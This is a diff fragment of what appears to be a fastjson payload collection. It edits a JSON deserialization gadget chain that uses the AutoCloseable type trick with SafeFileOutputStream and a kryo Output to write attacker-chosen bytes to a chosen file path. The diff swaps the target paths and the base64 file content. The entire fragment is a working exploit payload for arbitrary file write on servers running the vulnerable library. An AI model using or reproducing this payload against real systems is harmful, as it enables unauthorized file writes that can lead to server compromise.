@@ -701,13 +701,13 @@ https://b1ue.cn/archives/348.html   **使用Throwable子类造成信息泄露**
     "stream": {
         "@type": "java.lang.AutoCloseable",
         "@type": "org.eclipse.core.internal.localstore.SafeFileOutputStream",
-        "targetPath": "D:/wamp64/www/hacked.txt",
-        "tempPath": "D:/wamp64/www/test.txt"
+        "targetPath": "f:/test/pwn.txt",
+        "tempPath": "f:/test/test.txt"
     },
     "writer": {
         "@type": "java.lang.AutoCloseable",
         "@type": "com.esotericsoftware.kryo.io.Output",
-        "buffer": "cHduZWQ=",
+        "buffer": "YjF1M3I=",
         "outputStream": {
             "$ref": "$.stream"
         },
